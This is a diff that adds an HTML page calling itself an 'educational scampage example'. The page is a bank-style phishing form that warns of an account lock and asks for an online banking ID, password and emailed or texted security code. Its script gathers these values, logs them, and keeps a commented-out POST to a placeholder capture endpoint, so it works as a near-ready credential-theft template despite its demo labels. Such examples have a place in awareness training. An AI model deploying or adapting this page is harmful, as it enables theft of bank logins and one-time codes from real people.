@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Locked - Educational Scampage Example</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f8f8; /* Light gray background */
+            color: #333; /* Dark text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .letter-box {
+            border: 4px solid #2d1a47; /* Bank-like blue color */
+            padding: 30px;
+            max-width: 500px;
+            text-align: center;
+            margin: auto;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            background: #fff; /* White background */
+            border-radius: 15px;
+        }
+
+        .logo {
+            width: 300px; /* Adjusted logo size */
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #2d1a47; /* Bank-like blue color */
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+
+        p {
+            margin-bottom: 15px;
+            font-size: 18px;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .button-container {
+            margin-top: 30px;
+        }
+
+        .button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #2d1a47; /* Bank-like blue color */
+            color: #fff; /* White text */
+            text-decoration: none;
+            border-radius: 8px;
+            transition: background 0.3s ease-in-out;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .button:hover {
+            background: #1e1233; /* Darker shade on hover */
+        }
+
+        .alert {
+            color: #d32f2f;
+            font-weight: bold;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .success {
+            color: #2e7d32;
+            font-weight: bold;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="letter-box">
+        <img src="https://via.placeholder.com/300x100?text=Bank+Logo" alt="Bank Logo" class="logo">
+        <h2>Risk on Account: Account Lock</h2>
+        <p>Dear Valued Customer,</p>
+        <p>We have detected unusual activity on your account, putting it at risk of being locked for security reasons.</p>
+        <form id="verifyForm" onsubmit="handleSubmit(event)">
+            <div class="form-group">
+                <label for="username">Online Banking ID</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="securityCode">Security Code (Sent to your email/phone)</label>
+                <input type="text" id="securityCode" name="securityCode" required>
+            </div>
+            <div class="button-container">
+                <button type="submit" class="button">Verify Your Identity</button>
+            </div>
+        </form>
+        <p id="alertMessage" class="alert">Verification failed. Please check your details and try again.</p>
+        <p id="successMessage" class="success">Verification successful! Redirecting...</p>
+        <p>Please complete the form above to secure your account.</p>
+        <div class="footer">
+            <p>Please do not reply to this message. If you have any questions, contact the number on the back of your card.</p>
+            <p>Sincerely,<br>Example Bank Customer Support</p>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const securityCode = document.getElementById('securityCode').value;
+            const alertMessage = document.getElementById('alertMessage');
+            const successMessage = document.getElementById('successMessage');
+
+            // Simulate data capture (for educational purposes only)
+            const capturedData = {
+                username: username,
+                password: password,
+                securityCode: securityCode,
+                timestamp: new Date().toISOString()
+            };
+
+            // Log captured data to console (simulating backend storage)
+            console.log('Captured Data:', capturedData);
+
+            // Simulate sending data to a backend (disabled for safety)
+            /*
+            fetch('http://example.com/capture.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(capturedData)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Server Response:', data))
+            .catch(error => console.error('Error:', error));
+            */
+
+            // Show success message to mimic scampage behavior
+            successMessage.style.display = 'block';
+            alertMessage.style.display = 'none';
+
+            // Simulate redirect to a legitimate page
+            setTimeout(() => {
+                alert('Educational Demo: In a real scampage, your data would be sent to an attacker, and you might be redirected to a legitimate bank site.');
+                successMessage.style.display = 'none';
+                document.getElementById('verifyForm').reset();
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
